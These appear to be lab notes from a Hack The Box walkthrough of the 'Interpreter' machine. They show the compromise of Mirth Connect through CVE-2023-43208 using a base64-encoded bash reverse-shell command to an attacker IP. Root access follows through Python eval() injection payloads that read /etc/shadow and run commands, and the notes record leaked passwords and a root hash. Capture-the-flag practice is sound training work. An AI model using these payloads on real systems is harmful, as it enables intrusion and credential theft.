# Interpreter - HTB Lab Notes

## Target
- IP: 10.129.6.105
- Hostname: `mirth-connect` (added to /etc/hosts)

## Flags
- **User flag**: `2bdd1c08b73debe36bf89d0f11716dc2` (from `/home/sedric/user.txt`)
- **Root flag**: TBD — read `/root/root.txt` via eval injection

## Nmap Scan Results (External)
| Port  | State | Service   | Version                                    |
|-------|-------|-----------|--------------------------------------------|
| 22    | open  | SSH       | OpenSSH 9.2p1 Debian 2+deb12u7             |
| 80    | open  | HTTP      | Jetty                                      |
| 443   | open  | HTTPS     | Jetty (SSL)                                |
| 6661  | open  | TCP       | Mirth Connect MLLP listener (HL7)          |

## Internal Ports (localhost only)
| Port  | Service    | Notes                                            |
|-------|------------|--------------------------------------------------|
| 3306  | MySQL      | Mirth backend DB (mirthdb / MirthPass123!)       |
| 54321 | Flask/Werkzeug | notif.py — patient notification server, runs as ROOT |

## Full Exploitation Path

### 1. Recon
- SSL cert leaked hostname: `mirth-connect`
- **Mirth Connect 4.4.0** identified via unauthenticated `/api/server/version` (requires `X-Requested-With: XMLHttpRequest` header)
- Default creds `admin:admin` do NOT work

### 2. Initial Access — CVE-2023-43208 (Pre-Auth RCE)
- XStream deserialization on `/api/users` endpoint, no auth required
- Affects Mirth Connect < 4.4.1
- PoC: `jakabakos/CVE-2023-43208-mirth-connect-rce-poc`
- Java `Runtime.exec()` doesn't handle shell redirections — used base64 brace encoding:
```
python3 CVE-2023-43208.py -u https://mirth-connect -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNzcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
```
- Got shell as **mirth@interpreter**

### 3. Post-Exploitation Enumeration
- No sudo ability
- SUID binaries: all standard, nothing exploitable
- `/var/backups/hygiene/` — empty directory, root-owned
- Mirth install: `/usr/local/mirthconnect/`
- Mirth config (`/usr/local/mirthconnect/conf/mirth.properties`):
  - DB: `mirthdb` / `MirthPass123!`
  - Keystore storepass: `5GbU5HGTOOgE`
  - Keystore keypass: `tAuJfQeXdnPw`
- No curl on target (wget available)
- `/home/sedric/` — NO access as mirth user
- fail2ban running but default config (red herring)

### 4. MySQL Enumeration → Mirth Channel Discovery
- Database: `mc_bdd_prod`
- User `sedric` in PERSON table with hashed password (not crackable)
- **Critical find**: CHANNEL table revealed the full Mirth pipeline:
  1. Port 6661 (TCP/MLLP) receives HL7v2 messages
  2. Transformer converts HL7 → XML (patient data)
  3. Destination POSTs XML to `http://127.0.0.1:54321/addPatient`
- This revealed the hidden Flask endpoint route: `/addPatient`

### 5. Flask App (notif.py) Analysis
- **Werkzeug/2.2.2 Python/3.11.2** (Flask)
- Running as **root** via systemd service
- Accepts XML patient data at POST `/addPatient`
- Response format: `Patient {fname} {lname} ({gender}), {age} years old, received from {sender_app} at {timestamp}`
- Birth date format: `MM/DD/YYYY`

### 6. Privesc — Python eval() Injection (Root RCE)
- Input validation blocks: `; | \` $ \ { } [ ] , : space # @ ! * ~ ^ ?`
- Input validation allows: `( ) . _ ' " + = / letters digits`
- **Key discovery**: Curly braces `{}` are STRIPPED (not blocked) and the content inside is passed to Python `eval()`
- Confirmed via `[EVAL_ERROR]` messages leaking Python parse errors
- Example: `{open('/etc/shadow').read()}` in firstname field reads /etc/shadow as root
- `{__import__('os').popen('id').read()}` confirms `uid=0(root)`

### Exploit Payloads (via eval injection in firstname field)
```python
# Read files as root
{open('/etc/shadow').read()}
{open('/home/sedric/user.txt').read()}
{open('/root/root.txt').read()}

# Command execution as root
{__import__('os').popen('id').read()}
```

### Hashes from /etc/shadow
```
root:$y$j9T$o.VVihLzQteSMxpHLdRkO.$ye7gwugB75H18vxlZ9Yp8uak36M3opreZHoWrWOJto7:20307:0:99999:7:::
```

## Tools Used
- nmap (initial scan)
- CVE-2023-43208 PoC (jakabakos repo) — initial access
- mysql client — DB enumeration
- Python scripts — Flask endpoint interaction and eval injection

## Key Lessons
- Enumerate the database thoroughly — the CHANNEL table revealed the hidden internal service
- "Interpreter" = Python interpreter / eval() injection hint
- Internal services running as root are high-value targets
- Input sanitization that strips characters (vs blocking) can be exploited
